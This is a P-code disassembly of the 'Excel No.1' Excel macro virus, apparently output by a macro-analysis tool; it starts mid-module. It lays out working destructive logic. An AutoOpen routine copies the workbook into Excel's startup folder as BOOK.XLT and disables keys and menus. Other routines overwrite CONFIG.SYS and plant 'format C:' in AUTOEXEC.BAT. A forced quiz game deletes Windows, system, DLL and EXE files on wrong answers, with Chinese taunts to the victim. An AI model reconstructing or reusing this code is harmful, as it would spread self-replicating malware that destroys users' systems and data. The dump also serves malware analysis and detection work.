' 	ArgsMemCall Activate 0x0000 
' Line #16:
' 	LitVarSpecial (False)
' 	St OK 
' Line #17:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet1 - 2432 bytes
' _VBA_PROJECT_CUR/VBA/AutoOpen - 10514 bytes
' Line #0:
' 	Dim (Global Const) 
' 	LitStr 0x000D "C:\CONFIG.SYS"
' 	VarDefn Config
' Line #1:
' 	Dim (Global Const) 
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	VarDefn Autoexec
' Line #2:
' Line #3:
' 	Dim (Public) 
' 	VarDefn S (As Object)
' 	VarDefn OK (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn OfficeDir
' 	VarDefn TemplateDir
' 	VarDefn StartDir
' Line #5:
' 	FuncDefn (Public Sub Main())
' Line #6:
' 	LitStr 0x0011 "正在初始化設定..."
' 	St StatusBar 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #8:
' 	ArgsCall SaveFile 0x0000 
' Line #9:
' 	ArgsCall GetDirs 0x0000 
' Line #10:
' 	ArgsCall InterruptKeys 0x0000 
' Line #11:
' 	LitStr 0x001A "Excel No.1已經佔據您的系統"
' 	St StatusBar 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Public Sub GetDirs())
' Line #15:
' 	Ld Application 
' 	MemLd Path 
' 	St ExcelDir$ 
' Line #16:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St TemplateDir$ 
' Line #17:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St StartDir$ 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Public Sub KillMenu())
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	LitDI2 0x0009 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #22:
' 	LitDI2 0x0008 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #23:
' 	LitDI2 0x0006 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #24:
' 	LitDI2 0x0005 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #25:
' 	LitDI2 0x0004 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #26:
' 	LitDI2 0x0003 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #27:
' 	LitDI2 0x0002 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #28:
' 	LitDI2 0x0001 
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Public Sub ReAuto())
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	Ld Autoexec$ 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "AUTOEXEC.BAT"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld Autoexec$ 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	Ld Friend 
' 	St No 
' Line #36:
' 	LitStr 0x0004 "C:\c"
' 	Ld No 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #37:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "y"
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #38:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	PrintItemNL 
' Line #39:
' 	Ld No 
' 	Sharp 
' 	Close 0x0001 
' Line #40:
' 	Ld Friend 
' 	St No 
' Line #41:
' 	Ld Autoexec$ 
' 	Ld No 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #42:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "PATH = C:\;"
' 	Ld S 
' 	MemLd WinPath 
' 	Concat 
' 	LitStr 0x0009 "\COMMAND;"
' 	Concat 
' 	Ld S 
' 	MemLd SystemPath 
' 	Concat 
' 	PrintItemNL 
' Line #43:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "format C:/u/q/v:EXCELNO1 < c"
' 	PrintItemNL 
' Line #44:
' 	Ld No 
' 	Sharp 
' 	Close 0x0001 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Public Sub SaveFile())
' Line #47:
' 	Ld StartDir 
' 	LitStr 0x0009 "\BOOK.XLT"
' 	Concat 
' 	St False$ 
' Line #48:
' 	Ld False$ 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0008 "BOOK.XLT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	Ld False$ 
' 	ParamNamed FileName 
' 	Ld xlTemplate 
' 	ParamNamed FileFormat 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0002 
' Line #51:
' 	SetStmt 
' 	New <crash>
' 	Set S 
' Line #52:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #53:
' 	LitDI2 0x0001 
' 	LitStr 0x000D "Excel No.1 - "
' 	Ld c 
' 	Concat 
' 	Ld False$ 
' 	LitStr 0x0000 ""
' 	Ld S 
' 	ArgsMemCall CreateLink 0x0004 
' Line #54:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	SetStmt 
' 	LitNothing 
' 	Set S 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Public Sub InterruptKeys())
' Line #58:
' 	OnError (Resume Next) 
' Line #59:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #60:
' 	LitStr 0x000B "{BACKSPACE}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #61:
' 	LitStr 0x0007 "{BREAK}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #62:
' 	LitStr 0x0006 "{DOWN}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #63:
' 	LitStr 0x0004 "{UP}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #64:
' 	LitStr 0x0006 "{LEFT}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #65:
' 	LitStr 0x0007 "{RIGHT}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #66:
' 	LitStr 0x0005 "{ESC}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #67:
' 	LitStr 0x0005 "{DEL}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #68:
' 	LitStr 0x0006 "{HOME}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #69:
' 	LitStr 0x0005 "{END}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #70:
' 	LitStr 0x0006 "{PGDN}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #71:
' 	LitStr 0x0006 "{PGUP}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #72:
' 	LitStr 0x0008 "{RETURN}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #73:
' 	LitStr 0x0007 "{ENTER}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #74:
' 	LitStr 0x0005 "{TAB}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #75:
' 	LitStr 0x0005 "%{F4}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #76:
' 	LitStr 0x0004 "{F1}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #77:
' 	LitStr 0x0009 "{NUMLOCK}"
' 	LitStr 0x0000 ""
' 	ArgsMemCallWith OnKey 0x0002 
' Line #78:
' 	EndWith 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Public Sub SafeExit())
' Line #81:
' 	LitVarSpecial (True)
' 	St OK 
' Line #82:
' 	LitVarSpecial (True)
' 	Ld ThisWorkbook 
' 	MemSt Saved 
' Line #83:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Public Sub ReConfig())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	Ld Config$ 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "CONFIG.SYS"
' 	Eq 
' 	IfBlock 
' Line #88:
' 	LitStr 0x000D "C:\CONFIG.SYS"
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld Friend 
' 	St No 
' Line #91:
' 	Ld Config$ 
' 	Ld No 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #92:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "Rem **** You're infected by Excel No.1 Macro Virus!"
' 	PrintItemNL 
' Line #93:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Dos = Low"
' 	PrintItemNL 
' Line #94:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "FCBS = 255"
' 	PrintItemNL 
' Line #95:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "FILES = 255"
' 	PrintItemNL 
' Line #96:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "LastDrive = Z"
' 	PrintItemNL 
' Line #97:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "SET TEMP = C:\"
' 	PrintItemNL 
' Line #98:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "SET TMP = C:\"
' 	PrintItemNL 
' Line #99:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "STACKS = 64, 512"
' 	PrintItemNL 
' Line #100:
' 	Ld No 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "SWITCHES= /F /K /N"
' 	PrintItemNL 
' Line #101:
' 	Ld No 
' 	Sharp 
' 	Close 0x0001 
' Line #102:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Progress - 4984 bytes
' Line #0:
' 	FuncDefn (Public Declare Function SystemParametersInfo Lib "user32" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As , ByVal fuWinIni As Long) As Long)
' Line #1:
' 	LineCont 0x0008 06 00 08 00 11 00 08 00
' 	FuncDefn (Public Declare Function fCreateShellLink Lib "STKIT432.DLL" (ByVal Folder As String, ByVal ShortCutName As String, ByVal ExePath As String, ByVal Params As String) As Long)
' Line #2:
' 	FuncDefn (Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long)
' Line #3:
' 	FuncDefn (Public Declare Function GetWindowsDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #4:
' 	FuncDefn (Public Declare Function GetSystemDirectory Lib "kernel32" (ByVal lpBuffer As String, ByVal nSize As Long) As Long)
' Line #5:
' 	FuncDefn (Public Declare Function GetComputerName Lib "kernel32" (ByVal lpBuffer As String, nSize As Long) As Long)
' Line #6:
' 	FuncDefn (Public Declare Function GetPrivateProfileString Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpKeyName As , ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long)
' Line #7:
' 	FuncDefn (Public Declare Function WritePrivateProfileString Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpKeyName As , ByVal lpString As , ByVal lpFileName As String) As Long)
' Line #8:
' 	FuncDefn (Sub Begin())
' Line #9:
' 	LitStr 0x0014 "開始進入自我解毒程序"
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Concat 
' 	LitStr 0x000A "Excel No.1"
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	Ld Game 
' 	ArgsMemCall Show 0x0000 
' Line #11:
' 	Ld Guess 
' 	ArgsMemCall Show 0x0000 
' Line #12:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Game - 6367 bytes
' Line #0:
' 	Dim 
' 	VarDefn SafeOver (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub cmdStart_Click())
' Line #2:
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	Ld S 
' 	ArgsMemLd GetRandomNumber 0x0002 
' 	St d 
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	Ld d 
' 	SelectCase 
' Line #5:
' 	LitDI2 0x0001 
' 	LitDI2 0x002E 
' 	CaseTo 
' 	CaseDone 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Tar1 
' 	MemSt Visible 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Tar2 
' 	MemSt Visible 
' Line #8:
' 	LitStr 0x0006 "第三層"
' 	Ld Tar3 
' 	MemSt Caption 
' Line #9:
' 	Ld Arrow 
' 	MemLd Top 
' 	LitDI2 0x002D 
' 	Sub 
' 	Ld Arrow 
' 	MemSt Top 
' Line #10:
' 	Ld Arrow 
' 	MemLd LBound 
' 	LitDI2 0x003C 
' 	Sub 
' 	Ld Arrow 
' 	MemSt LBound 
' Line #11:
' 	LitDI2 0x0000 
' 	Ld Arrow 
' 	ArgsMemCall ZOrder 0x0001 
' Line #12:
' 	LitStr 0x0024 "哈哈！我就說嘛！今天是您倒楣的日子！"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #13:
' 	ArgsCall ReConfig 0x0000 
' Line #14:
' 	ArgsCall ReAuto 0x0000 
' Line #15:
' 	LitDI2 0x002F 
' 	LitDI2 0x0050 
' 	CaseTo 
' 	CaseDone 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Tar1 
' 	MemSt Visible 
' Line #17:
' 	LitStr 0x0006 "第二層"
' 	Ld Tar2 
' 	MemSt Caption 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Tar3 
' 	MemSt Visible 
' Line #19:
' 	Ld Arrow 
' 	MemLd Top 
' 	LitDI2 0x003C 
' 	Sub 
' 	Ld Arrow 
' 	MemSt Top 
' Line #20:
' 	Ld Arrow 
' 	MemLd LBound 
' 	LitDI2 0x001E 
' 	Sub 
' 	Ld Arrow 
' 	MemSt LBound 
' Line #21:
' 	LitDI2 0x0000 
' 	Ld Arrow 
' 	ArgsMemCall ZOrder 0x0001 
' Line #22:
' 	LitStr 0x0024 "哈哈！我就說嘛！今天是您倒楣的日子！"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #23:
' 	ArgsCall ReConfig 0x0000 
' Line #24:
' 	ArgsCall KillMenu 0x0000 
' Line #25:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0006 "\*.ini"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #26:
' 	CaseElse 
' Line #27:
' 	LitStr 0x000C "第一層－紅心"
' 	Ld Tar1 
' 	MemSt Caption 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Tar2 
' 	MemSt Visible 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Tar3 
' 	MemSt Visible 
' Line #30:
' 	Ld Arrow 
' 	MemLd Top 
' 	LitDI2 0x003C 
' 	Sub 
' 	Ld Arrow 
' 	MemSt Top 
' Line #31:
' 	LitDI2 0x0000 
' 	Ld Arrow 
' 	ArgsMemCall ZOrder 0x0001 
' Line #32:
' 	LitStr 0x002E "真走運！讓您蒙到啦！下一關一定讓您死得很難看！"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #33:
' 	EndSelect 
' Line #34:
' 	LitVarSpecial (True)
' 	St SafeOver 
' Line #35:
' 	Ld Game 
' 	ArgsCall Unlock 0x0001 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #38:
' 	LitVarSpecial (False)
' 	St SafeOver 
' Line #39:
' 	SetStmt 
' 	New id_FFFF
' 	Set S 
' Line #40:
' 	EndSub 
' Line #41:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #42:
' 	OnError (Resume Next) 
' Line #43:
' 	Ld SafeOver 
' 	IfBlock 
' Line #44:
' 	LitVarSpecial (False)
' 	St Cancel 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	LitVarSpecial (True)
' 	St Cancel 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	SetStmt 
' 	LitNothing 
' 	Set S 
' Line #49:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Guess - 38027 bytes
' Line #0:
' 	Dim 
' 	VarDefn SafeOver (As Boolean)
' 	VarDefn Ret (As Integer)
' 	VarDefn Total (As Integer)
' Line #1:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	VarDefn Q (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	VarDefn Opt1 (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	VarDefn Opt2 (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	VarDefn Opt3 (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	VarDefn Ans (As Integer)
' Line #2:
' 	FuncDefn (Private Function Choose(id_FFFE As Integer) As Integer)
' Line #3:
' 	LitDI2 0x0001 
' 	LitDI2 0x0049 
' 	Ld S 
' 	ArgsMemLd GetRandomNumber 0x0002 
' 	St d 
' Line #4:
' 	Ld d 
' 	ArgsLd Q 0x0001 
' 	Ld Content 
' 	MemSt Caption 
' Line #5:
' 	Ld d 
' 	ArgsLd Opt1 0x0001 
' 	Ld O1 
' 	MemSt Caption 
' Line #6:
' 	Ld d 
' 	ArgsLd Opt2 0x0001 
' 	Ld O2 
' 	MemSt Caption 
' Line #7:
' 	Ld d 
' 	ArgsLd Opt3 0x0001 
' 	Ld O3 
' 	MemSt Caption 
' Line #8:
' 	Ld d 
' 	St Choose 
' Line #9:
' 	EndFunc 
' Line #10:
' 	FuncDefn (Private Sub Finish())
' Line #11:
' 	Ld LabRight 
' 	MemLd Caption 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #12:
' 	LitStr 0x002E "真是超級遜斃了！一題也沒答對！你在混吃等死啊？"
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0008 "\WIN.COM"
' 	Concat 
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0009 "\LOSE.COM"
' 	Concat 
' 	Name 
' Line #15:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #16:
' 	Ld S 
' 	MemLd SystemPath 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #17:
' 	Ld LabRight 
' 	MemLd Caption 
' 	ArgsLd Val 0x0001 
' 	Ld Total 
' 	Eq 
' 	ElseIfBlock 
' Line #18:
' 	LitStr 0x0052 "真棒！完全答對！Excel No.1 作者群對您致崇高的敬意，按下確定按鈕後自動清除本病毒..."
' 	ArgsCall MsgBox 0x0001 
' Line #19:
' 	LitVarSpecial (True)
' 	St SafeOver 
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #22:
' 	StartForVariable 
' 	Ld w2 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #23:
' 	LitVarSpecial (True)
' 	Ld w2 
' 	MemSt Saved 
' Line #24:
' 	StartForVariable 
' 	Ld w2 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	LitVarSpecial (True)
' 	St OK 
' Line #26:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	LitStr 0x000D "您總共答對了 "
' 	Ld LabRight 
' 	MemLd Caption 
' 	Concat 
' 	LitStr 0x0003 " 題"
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	LitVarSpecial (True)
' 	St SafeOver 
' Line #31:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Private Sub Correct())
' Line #34:
' 	Ld LabRight 
' 	MemLd Caption 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld LabRight 
' 	MemSt Caption 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Private Sub Wrong())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	Dim (Static) 
' 	VarDefn T
' Line #39:
' 	Ld T 
' 	SelectCase 
' Line #40:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #41:
' 	Ld S 
' 	MemLd SystemPath 
' 	LitStr 0x0006 "\*.DLL"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #42:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #43:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0006 "\*.COM"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #44:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #45:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0006 "\*.EXE"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #46:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #47:
' 	Ld S 
' 	MemLd SystemPath 
' 	LitStr 0x0006 "\*.DRV"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #48:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #49:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0006 "\*.INF"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #50:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #51:
' 	Ld S 
' 	MemLd WinPath 
' 	LitStr 0x0006 "\*.INI"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #52:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #53:
' 	Ld CurDir 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #54:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #55:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #56:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #57:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #58:
' 	CaseElse 
' Line #59:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0002 
' 	For 
' Line #60:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	LitDI2 0x0063 
' 	Ld S 
' 	ArgsMemLd GetRandomNumber 0x0002 
' 	For 
' Line #61:
' 	Ld m 
' 	LitStr 0x0005 "Virus"
' 	Ld n 
' 	Concat 
' 	LitStr 0x000E "C:\COMMAND.COM"
' 	LitStr 0x0000 ""
' 	Ld S 
' 	ArgsMemCall CreateLink 0x0004 
' Line #62:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	StartForVariable 
' 	Ld m 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	EndSelect 
' Line #65:
' 	Ld T 
' 	LitDI2 0x0001 
' 	Add 
' 	St T 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #68:
' 	Ld LabRest 
' 	MemLd Caption 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	ArgsCall Finish 0x0000 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	ArgsLd Choose 0x0000 
' 	St Ret 
' Line #72:
' 	LitVarSpecial (True)
' 	Ld Sure 
' 	MemSt Enabled 
' Line #73:
' 	LitVarSpecial (False)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Private Sub Sure_Click())
' Line #76:
' 	Ld Ret 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #77:
' 	Ld Ret 
' 	ArgsLd Ans 0x0001 
' 	SelectCase 
' Line #78:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #79:
' 	Ld O1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #80:
' 	ArgsCall Correct 0x0000 
' Line #81:
' 	ElseBlock 
' Line #82:
' 	ArgsCall Wrong 0x0000 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #85:
' 	Ld O2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #86:
' 	ArgsCall Correct 0x0000 
' Line #87:
' 	ElseBlock 
' Line #88:
' 	ArgsCall Wrong 0x0000 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #91:
' 	Ld O3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #92:
' 	ArgsCall Correct 0x0000 
' Line #93:
' 	ElseBlock 
' Line #94:
' 	ArgsCall Wrong 0x0000 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	EndSelect 
' Line #97:
' 	Ld LabRest 
' 	MemLd Caption 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Ld LabRest 
' 	MemSt Caption 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Sure 
' 	MemSt Enabled 
' Line #99:
' 	LitVarSpecial (True)
' 	Ld CommandButton1 
' 	MemSt Enabled 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #102:
' 	LitVarSpecial (False)
' 	St SafeOver 
' Line #103:
' 	SetStmt 
' 	New 0
' 	Set S 
' Line #104:
' 	ArgsCall ReadQuestions 0x0000 
' Line #105:
' 	ArgsCall ReadQuestions2 0x0000 
' Line #106:
' 	LitVarSpecial (False)
' 	Ld Sure 
' 	MemSt Enabled 
' Line #107:
' 	Ld LabRest 
' 	MemLd Caption 
' 	ArgsLd Val 0x0001 
' 	St Total 
' Line #108:
' 	LitStr 0x0012 "按一下按鈕開始測驗"
' 	Ld Content 
' 	MemSt Caption 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #111:
' 	Ld SafeOver 
' 	IfBlock 
' Line #112:
' 	LitVarSpecial (False)
' 	St Cancel 
' Line #113:
' 	ElseBlock 
' Line #114:
' 	LitVarSpecial (True)
' 	St Cancel 
' Line #115:
' 	ExitSub 
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	SetStmt 
' 	LitNothing 
' 	Set S 
' Line #118:
' 	EndSub 
' Line #119:
